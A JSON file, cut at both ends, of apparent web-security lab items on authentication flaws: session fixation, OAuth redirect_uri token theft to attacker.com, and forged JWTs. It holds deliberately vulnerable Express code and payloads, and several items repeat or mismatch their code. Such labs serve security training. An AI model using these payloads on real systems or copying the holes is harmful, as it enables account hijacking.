      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session; res.cookie('session', session); res.send('<form method=\"POST\" action=\"/do-login\"><input name=\"user\"><input name=\"pass\"><input type=\"submit\"></form>'); }); app.post('/do-login', (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'fixed-session-abc') res.send('Carlos account page'); else res.send('Invalid session'); }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "http://lab-url/login?session=fixed-session-abc",
        "Cookie: session=fixed-session-abc"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration in Token Exchange Endpoint",
      "Lab Description": "The lab uses an OAuth provider for authentication but fails to validate the `redirect_uri` and `client_id` parameters. This enables an attacker to manipulate the authorization flow and exchange an arbitrary `code` for a victim’s token. To solve: Hijack an access token using a rogue redirect URI and access Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to analyze the OAuth flow and observe the exchange between `/auth`, `/callback`, and `/token`.",
        "Craft a GET request to `/auth` with a malicious `redirect_uri` pointing to your domain (e.g., https://attacker.com/callback) and a valid `client_id`.",
        "Send the link to the victim to trigger an OAuth code grant. Capture the code on your rogue redirect endpoint.",
        "Send a POST request to `/token` with the captured code and your malicious `redirect_uri`, bypassing the verification logic.",
        "Use the received access token to call `/my-account` as the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const validCodes = { 'authcode123': 'token-for-carlos' }; app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (validCodes[code]) { res.json({ access_token: validCodes[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos account data'); else res.status(403).send('Access denied'); }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Token Exchange Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "GET /auth?client_id=trusted-app&redirect_uri=https://attacker.com/callback",
        "POST /token { \"code\": \"authcode123\", \"redirect_uri\": \"https://attacker.com/callback\" }",
        "Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT signature verification bypass in Authorization middleware",
      "Lab Description": "The application uses JWTs for session management but fails to validate the token signature correctly when the `alg` header is set to 'none'. The backend simply decodes the payload and grants access without cryptographic verification. To solve: forge a valid token for the user 'admin' and access the /admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a request after logging in with a normal user using Burp Suite and extract the JWT from the Authorization header.",
        "Decode the JWT using jwt.io and observe the alg field is set to 'HS256'. Modify it to 'none'.",
        "Craft a new payload with { \"user\": \"admin\" }, set alg to 'none', and leave the signature empty.",
        "Use Postman or Burp to send a request to /admin with the forged token in the Authorization header.",
        "Verify access to the admin dashboard and check for a flag or message confirming successful privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; const jwtSecret = 'supersecretkey'; app.use((req, res, next) => { const auth = req.headers.authorization; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { req.user = jwt.verify(token, jwtSecret); return next(); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(401).send('No token provided'); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
      ]
    },
    {
      "Lab scenario": "Open redirect in OAuth flow in redirect_uri parameter",
      "Lab Description": "This lab’s OAuth implementation contains an open redirect vulnerability in the `redirect_uri` parameter. The authorization server does not validate the redirect destination properly. To solve: steal the OAuth authorization code of another user by injecting a crafted redirect_uri that forwards the code to your attacker-controlled domain.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to proxy and observe the initial OAuth request sent to the authorization endpoint.",
        "Identify the redirect_uri parameter and test injecting a value like https://attacker.com/callback.",
        "Craft a phishing link to the victim using the modified redirect_uri to send the authorization code to your server.",
        "Deploy a basic listener (e.g., using ngrok or requestbin) and receive the stolen code.",
        "Manually exchange the stolen code for a token using Postman and access the victim’s resource."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (!redirect_uri || !response_type || !client_id) { return res.status(400).send('Missing parameters'); }  const authCode = 'AUTH12345'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.listen(4000, () => console.log('OAuth Redirection Lab running on port 4000'));",
      "payloads": [
        "https://victim.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
        "https://auth.vulnapp.com/auth?client_id=test&redirect_uri=https://evil.com&response_type=code"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login endpoint via cookie injection",
      "Lab Description": "The login flow does not generate a new session upon authentication. This allows attackers to set a known session ID before login, then trick a victim into logging in with it. To solve: fixate a known session ID for Carlos and access /my-account using the same session ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to send a GET /login request with a custom session cookie (e.g., sessionid=abc123).",
        "Trick the victim into logging in while using this same session ID (simulate or assume they log in with that session cookie).",
        "Once authenticated, use the same session ID to access the authenticated user’s /my-account page.",
        "Confirm the session contains Carlos's data without re-authentication.",
        "Verify unauthorized access to account data and session reuse confirmation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecure' }]; let sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessId = req.cookies.sessionid; if (sessId) { sessions[sessId] = username; res.send('Logged in'); } else { res.status(400).send('Session ID missing'); } } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Account details for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
      "payloads": [
        "Cookie: sessionid=attackersession",
        "GET /login?username=carlos&password=supersecure HTTP/1.1\\nCookie: sessionid=attackersession",
        "GET /my-account HTTP/1.1\\nCookie: sessionid=attackersession"
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow",
      "Lab Description": "This lab contains a session fixation vulnerability in the login flow. The application reuses the session identifier set prior to authentication. The application sets a session cookie before login and does not regenerate it upon successful authentication. To solve: log in as Carlos by leveraging a fixed session identifier to hijack his session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite Proxy to capture a request to /login and note the session cookie set before logging in.",
        "Send the GET /login request to Burp Repeater. Log out and change the session cookie to match your original session.",
        "Craft a phishing link or client-side JS that forces the victim (Carlos) to log in while having your session ID.",
        "Wait or simulate a login by Carlos using your fixed session ID.",
        "Access /my-account with the hijacked session and confirm access to Carlos’s account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) { res.send(`Welcome back, ${req.session.username}`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Set-Cookie: connect.sid=fixedSessionId;",
        "Phishing link: http://lab.com/login?sid=fixedSessionId",
        "Session reuse during victim login"
      ]
    },
    {
      "Lab scenario": "JWT token tampering via 'none' algorithm",
      "Lab Description": "This lab uses JSON Web Tokens (JWT) for user sessions but fails to enforce a valid signing algorithm. It accepts tokens signed with 'none', allowing users to forge tokens without a signature. To solve: Forge a JWT with 'admin' privileges and access the admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept a valid JWT using Burp Suite Proxy or Postman during a login.",
        "Decode the JWT using jwt.io and observe the algorithm is HS256.",
        "Modify the JWT header to use \"alg\":\"none\" and set payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
        "Remove the signature portion of the JWT completely.",
        "Set the modified JWT in Authorization header and access /admin-panel."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username, role: 'admin' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
        "JWT: <base64(header)>.<base64(payload)>."
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
      "Lab Description": "This lab implements OAuth 2.0 login using a third-party provider but fails to validate redirect_uri properly. An attacker can inject an external redirect to exfiltrate tokens. To solve: Steal an access token by exploiting an open redirect and use it to access Carlos’s profile page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP or Burp to capture the OAuth authorization URL.",
        "Modify the redirect_uri parameter to point to a domain you control (e.g., https://attacker.com/callback).",
        "Send a phishing link to the victim or simulate their login flow.",
        "Receive the access token on your callback endpoint.",
        "Replay the token to /profile using Authorization: Bearer <stolen_token> to access Carlos’s profile."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'abc123'; const REDIRECT_URIS = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`https://oauth.provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}`); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') { res.send('Carlos profile page'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://lab.com/auth?redirect_uri=https://attacker.com/callback",
        "Captured Token: Bearer supersecrettoken",
        "Phishing link with poisoned redirect_uri"
      ]
    },
    {
      "Lab scenario": "Session Fixation in REST-based login flow",
      "Lab Description": "This lab implements RESTful authentication via session cookies but fails to regenerate the session ID upon successful login. The application incorrectly trusts session state established prior to login. To solve: Fixate a session for Carlos and gain access to his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to initiate an unauthenticated session and capture the Set-Cookie header from GET /login",
        "Send multiple GET requests to confirm session ID is reused even after login",
        "Use Postman to manually log in as carlos while reusing the fixated session ID",
        "Observe that authentication completes without regenerating session ID, giving access",
        "Send GET /my-account with the fixated cookie and confirm access to Carlos's account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'supersecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account Access'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
      "payloads": [
        "Session-ID reuse before and after POST /login",
        "GET /my-account with fixated session cookie",
        "POST /login with valid creds and pre-injected JSESSIONID"
      ]
    },
    {
      "Lab scenario": "JWT None Algorithm Authentication Bypass",
      "Lab Description": "The app uses JSON Web Tokens for user sessions but fails to validate the JWT signature algorithm properly. It accepts unsigned tokens if 'alg' is set to 'none'. To solve: Modify the JWT to impersonate Carlos without a valid signature and access the protected resource.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to capture a valid JWT token from your account login response",
        "Decode the token using jwt.io and observe the 'alg' header is RS256",
        "Replace 'alg' with 'none' and change 'sub' or 'username' field to carlos",
        "Strip the signature and construct a new token with header.payload.",
        "Send the tampered token in Authorization: Bearer header and access /account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const privateKey = 'PRIVATE_KEY'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
      "payloads": [
        "JWT with header: {\"alg\":\"none\"}",
        "Payload: {\"username\":\"carlos\"}",
        "Authorization: Bearer header with unsigned JWT"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration with Open Redirect in Callback",
      "Lab Description": "This app uses OAuth2 with an authorization code grant flow. However, the redirect_uri parameter is not properly validated, allowing redirection to attacker-controlled domains. To solve: Steal the authorization code of Carlos via a crafted OAuth login URL and gain access to his token-protected account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth redirect URL during login initiation",
        "Modify the redirect_uri to point to your public request bin or attacker server",
        "Send the crafted OAuth login link to the victim (Carlos)",
        "Capture the authorization code redirected to your server",
        "Exchange the stolen code for an access token and use it to call /account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const authCode = 'auth123'; res.redirect(redirect_uri + '?code=' + authCode); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'auth123') res.json({ access_token: 'token-for-carlos' }); else res.status(403).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos OAuth Account'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "https://example.com/auth?client_id=123&redirect_uri=https://attacker.com/callback",
        "Captured code=auth123 from callback",
        "GET /token?code=auth123 -> extract access_token",
        "Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login endpoint",
      "Lab Description": "The login functionality improperly trusts pre-authentication session tokens. The application fails to issue a new session identifier upon successful login. To solve: fixate a session ID before login and use it to access Carlos’s account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to capture the GET /login request before any login attempt.",
        "Observe that a session cookie (e.g., sessionId) is already issued before login.",
        "Send the login request for Carlos using valid credentials via Burp Repeater with the fixed sessionId still active.",
        "After successful login, reuse the same sessionId and send a GET request to /account.",
        "Verify successful account access via the authenticated session with the fixed session ID."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.cookie('sessionId', 'static-session-id'); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.sessionId === 'static-session-id') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "Pre-assign sessionId=static-session-id before login",
        "Send POST /login with credentials and fixed sessionId",
        "Reuse fixed sessionId to access /account"
      ]
    },
    {
      "Lab scenario": "JWT tampering vulnerability in token verification endpoint",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication but fails to validate the algorithm field securely. The server accepts tokens with the algorithm set to 'none', leading to authentication bypass. To solve: forge a valid JWT that grants admin access without a signature.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to capture a valid JWT token from the Authorization header after a successful login.",
        "Decode the token using jwt.io and examine the payload and algorithm fields.",
        "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set the algorithm to 'none'.",
        "Remove the signature portion entirely and re-encode the header and payload using base64url.",
        "Use Postman to send a request with the forged token in the Authorization header and access /admin."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
        "JWT: base64url(header) + '.' + base64url(payload) + '.'"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in implicit grant flow",
      "Lab Description": "The OAuth implementation uses the implicit flow with weak redirect URI validation, enabling token theft via open redirection. The application trusts redirect URIs from user input. To solve: craft a malicious redirect to steal Carlos’s access token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to capture the initial OAuth request flow on login.",
        "Notice the redirect_uri parameter is weakly validated against an allowlist.",
        "Craft a new OAuth request with a redirect_uri pointing to a malicious site (e.g., https://attacker.com#access_token=...).",
        "Send the modified OAuth URL to Carlos or simulate a login as Carlos if credentials are known.",
        "Capture the access token from the redirect and use it to access Carlos’s data via the /userinfo endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = 'carlos-token'; res.redirect(redirect_uri + '#access_token=' + token); } else { res.status(400).send('Unsupported flow'); } }); app.get('/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) res.send('User data for ' + tokens[token]); else res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running on http://localhost:' + PORT));",
      "payloads": [
        "https://vulnerable-app.com/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com",
        "Captured token from redirect: #access_token=carlos-token",
        "GET /userinfo with Authorization: Bearer carlos-token"
      ]
    },
    {
      "Lab scenario": "JWT token signature verification bypass in login endpoint",
      "Lab Description": "The application's JWT authentication mechanism incorrectly trusts the 'alg' header provided by the client. The server uses a public key but does not enforce the expected algorithm. The application signs JWT tokens using RS256, but accepts tokens where the algorithm is changed to HS256. To solve: Craft a JWT with the alg header set to HS256 and sign it using the public key as the HMAC secret to impersonate Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept a valid login response and extract the JWT",
        "Decode the token using jwt.io or jwt_tool to inspect the headers and payload",
        "Change the alg field from RS256 to HS256 and modify the payload sub to 'carlos'",
        "Use the server's public key as the HMAC secret to sign the token using HS256",
        "Replace the original JWT in a request to /my-account and confirm access to Carlos's account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub) res.send(`Welcome ${decoded.sub}`); else res.status(403).send('Invalid token'); } catch (err) { res.status(403).send('Token verification failed'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); } catch (err) { res.status(403).send('Token verification error'); } }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"HS256\"}",
        "Payload: {\"sub\":\"carlos\"}",
        "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in OAuth 2.0 callback handler",
      "Lab Description": "The OAuth implementation fails to generate a new session upon successful login. Attackers can craft a login URL with a fixed session ID and trick users into authenticating with it. The application binds the victim's account to an attacker-controlled session. To solve: Fixate a session for Carlos by generating a session ahead of time, initiating OAuth flow with that session, and capturing his authenticated session post-login.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman or Burp Suite to initiate a login and capture the Set-Cookie header containing the session ID",
        "Store that session ID and embed it in a crafted OAuth login URL as a Cookie header",
        "Send the crafted login URL to Carlos (simulated)",
        "After Carlos logs in via the link, reuse the fixed session ID to access his account",
        "Request /my-account using the fixed session cookie and verify the login was hijacked"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/callback', (req, res) => { const { code, state } = req.query; const sessionId = req.cookies.session_id; if (sessionId) { sessions[sessionId] = { username: 'carlos' }; res.redirect('/my-account'); } else { res.status(400).send('No session'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session_id; const session = sessions[sessionId]; if (session && session.username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Not authorized'); }); app.listen(4000);",
      "payloads": [
        "GET /oauth/callback?code=abc123&state=xyz HTTP/1.1 with Cookie: session_id=fixed123",
        "Reuse Cookie: session_id=fixed123 to access /my-account"
      ]
    },
    {
      "Lab scenario": "Verbose error leakage in multi-step GraphQL auth process",
      "Lab Description": "The application's GraphQL login mutation leaks detailed error messages that help enumerate valid users and token states. The GraphQL API responds differently when incorrect usernames or passwords are provided. To solve: Enumerate a valid user, retrieve a temporary token from a leaked error, and escalate access via an unprotected token mutation.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to send multiple login GraphQL queries and observe differences in error messages",
        "Enumerate valid usernames based on verbose errors (e.g., 'User exists' vs 'Invalid username')",
        "Send a login request for the valid user with an incorrect password to retrieve the temporary token from the verbose error",
        "Use the token in a follow-up mutation to reset the password or authenticate directly",
        "Query myAccount with the new credentials to confirm successful exploitation"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'secret', tempToken: 'temp-123' } }; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const usernameMatch = query.match(/username: \"(.*?)\"/); const passwordMatch = query.match(/password: \"(.*?)\"/); if (!usernameMatch) return res.json({ error: 'Missing username' }); const username = usernameMatch[1]; const password = passwordMatch[1]; if (!users[username]) return res.json({ error: 'Invalid username' }); if (users[username].password !== password) return res.json({ error: `Wrong password, use temp token: ${users[username].tempToken}` }); return res.json({ data: { login: { token: 'valid-token' } } }); } if (query.includes('myAccount')) { const tokenMatch = query.match(/token: \"(.*?)\"/); if (tokenMatch && tokenMatch[1] === 'valid-token') return res.json({ data: { myAccount: { username: 'carlos' } } }); return res.json({ error: 'Access denied' }); } res.json({ error: 'Invalid query' }); }); app.listen(4000);",
      "payloads": [
        "GraphQL login query: { login(username: \"carlos\", password: \"wrongpass\") }",
        "Extract leaked token: temp-123",
        "GraphQL mutation: { resetPassword(tempToken: \"temp-123\", newPassword: \"newpass\") }",
        "GraphQL login: { login(username: \"carlos\", password: \"newpass\") }",
        "GraphQL query: { myAccount(token: \"valid-token\") }"
      ]
    },
    {
      "Lab scenario": "Session Fixation in Login Flow",
      "Lab Description": "This lab's login flow is vulnerable to session fixation due to the reuse of session identifiers before and after authentication. The application issues a session ID on initial visit and fails to regenerate it after successful login. To solve: hijack Carlos's session using a pre-set session ID to access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a GET / request to capture a new session cookie.",
        "Send the session cookie to Carlos via social engineering (simulate manually).",
        "Once Carlos logs in with the fixed session ID, reuse the same cookie to access his session.",
        "Browse to /account with the fixed cookie to verify session hijack.",
        "Confirm access to Carlos's data and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/', (req, res) => { res.send('Welcome to our site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { if (req.session.username) { res.send(`User account for ${req.session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
      "payloads": [
        "Set-Cookie: connect.sid=fixedsessionid; Path=/; HttpOnly",
        "Reuse the session cookie after victim login",
        "Manual simulation of session fixation through social engineering"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Algorithm Bypass",
      "Lab Description": "This lab uses JSON Web Tokens for session management. It improperly supports the 'none' algorithm and accepts unsigned tokens. The application uses JWTs stored in a cookie to manage sessions but fails to validate signatures correctly. To solve: craft a token for Carlos using the none algorithm and access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept JWT from an authenticated user using Burp Suite.",
        "Decode the token header and payload using jwt.io or similar.",
        "Replace the 'alg' field with 'none' and modify payload to impersonate 'carlos'.",
        "Remove the signature part and set the new JWT as a cookie in Burp.",
        "Send a request to /profile with the tampered JWT and confirm Carlos’s account access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos' }]; app.get('/profile', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Unauthorized'); try { const decoded = jwt.verify(token, 'secretkey'); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\"}",
        "Unsigned token: base64(header).base64(payload).",
        "Set-Cookie: token=<tampered JWT>"
      ]
    },
    {
      "Lab scenario": "OAuth2 Redirect URI Manipulation",
      "Lab Description": "This lab integrates OAuth2 for social login but allows arbitrary redirection via open redirect in the redirect_uri parameter. The application does not validate the redirect URI domain properly. To solve: trick the app into redirecting to a malicious endpoint to steal Carlos’s token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to proxy and observe the OAuth2 authorization flow.",
        "Identify the redirect_uri parameter used in the authorization request.",
        "Modify redirect_uri to point to an attacker-controlled site (exploit-server).",
        "Send phishing link to Carlos to initiate login using OAuth2 flow.",
        "Capture Carlos’s access token and use it to access /account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://authserver.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/callback', (req, res) => { const token = req.query.access_token; if (token) { res.send(`Token received: ${token}`); } else { res.send('Login failed'); } }); app.listen(4000);",
      "payloads": [
        "redirect_uri=https://attacker.com/callback",
        "Authorization URL with malicious redirect",
        "access_token captured from redirected request"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in API authorization",
